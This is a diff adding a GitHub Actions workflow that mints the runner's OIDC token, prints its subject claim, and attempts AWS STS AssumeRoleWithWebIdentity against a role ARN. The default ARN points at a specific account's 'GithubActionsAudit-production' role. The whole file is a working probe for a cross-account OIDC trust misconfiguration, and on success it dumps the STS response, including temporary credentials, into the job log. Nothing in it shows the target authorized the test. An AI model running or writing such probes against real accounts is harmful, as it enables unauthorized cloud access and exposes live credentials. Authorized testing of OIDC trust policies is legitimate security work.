@@ -1,0 +1,39 @@
+name: c211-i82962-oidc-assume
+on:
+  workflow_dispatch:
+    inputs:
+      role_arn:
+        description: 'AWS role ARN to attempt sts:AssumeRoleWithWebIdentity against'
+        required: true
+        default: 'arn:aws:iam::273709947018:role/VyomQuantGithubActionsAudit-production'
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 10
+    steps:
+      - name: mint-oidc-and-attempt-assume
+        env:
+          ROLE: ${{ inputs.role_arn }}
+        run: |
+          set -u
+          TOKEN=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          echo "OIDC_LEN ${#TOKEN}"
+          SUB=$(python3 -c "import base64,json; p='$TOKEN'.split('.')[1]; p+='='*(-len(p)%4); print(json.loads(base64.urlsafe_b64decode(p))['sub'])")
+          echo "SUB=$SUB"
+          python3 - "$TOKEN" "$ROLE" <<'PY'
+          import sys, urllib.parse, urllib.request
+          tok, role = sys.argv[1], sys.argv[2]
+          q = urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':role,'RoleSessionName':'c211-i82962','WebIdentityToken':tok})
+          req = urllib.request.Request('https://sts.amazonaws.com/?'+q)
+          try:
+              body = urllib.request.urlopen(req, timeout=40).read().decode()
+              print('ASSUME_OK')
+              print(body[:2500])
+          except Exception as e:
+              eb = getattr(e,'read',lambda:b'')()
+              print('ASSUME_ERR', type(e).__name__, str(e)[:300])
+              print(eb.decode('utf-8','replace')[:2500])
+          PY
